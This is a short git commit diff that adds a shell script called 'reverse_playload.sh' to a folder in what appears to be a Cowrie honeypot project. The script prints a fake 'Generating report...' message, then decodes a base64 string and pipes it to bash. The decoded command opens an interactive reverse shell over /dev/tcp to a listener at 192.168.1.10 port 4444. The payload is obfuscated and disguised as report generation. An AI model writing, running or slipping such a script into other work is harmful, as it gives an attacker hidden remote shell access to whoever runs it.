205e4910a1b49c29877ac4e865bfafe35b6becfd
Marco <marcodimaulo93@gmail.com>
2025-05-30 23:08:08 +0200

    Update reverse_playload.sh

--- cowrie/script/reverse_playload.sh
+++ cowrie/script/reverse_playload.sh
@@ -1,1 +1,12 @@
+# reverse_payload.sh:
+
+#!/bin/bash  
+echo "[*] Generating report..."  
+sleep 2  
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx' | base64 -d | bash  
+
+
+
+
+
 
